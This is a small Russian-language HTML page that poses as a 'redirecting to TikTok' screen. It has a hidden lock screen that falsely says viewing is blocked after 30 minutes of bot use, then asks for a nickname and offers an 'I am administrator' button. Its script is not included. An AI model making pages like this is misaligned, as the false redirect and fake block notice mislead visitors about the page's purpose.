<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Переход на TikTok</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container" id="main-container">
        <h1>Подождите, идет переход на TikTok...</h1>
        <div class="loading">Loading...</div>
        <img src="https://cdn-icons-png.flaticon.com/128/4461/4461744.png" alt="Loading Icon" class="icon">
        <p class="info">TikTok — это платформа для создания и обмена короткими видео. Проверьте самые горячие тренды!</p>
        <div class="socials">
            <a href="https://twitter.com" target="_blank">Twitter</a>
            <a href="https://instagram.com" target="_blank">Instagram</a>
        </div>
    </div>

    <div class="lock-screen" id="lock-screen" style="display: none;">
        <img src="https://cdn-icons-png.flaticon.com/128/481/481195.png" alt="Lock Icon" class="lock-icon">
        <p class="lock-text">Просмотр заблокирован. Вы не можете продолжить просмотр, так как пользовались ботом 30 минут.</p>
        <input type="text" id="nickname" placeholder="Введите ваш ник">
        <button id="submit-nickname">Отправить</button>
        <button id="admin-button">Я администратор</button>
    </div>

    <script src="script.js"></script>
</body>
</html>
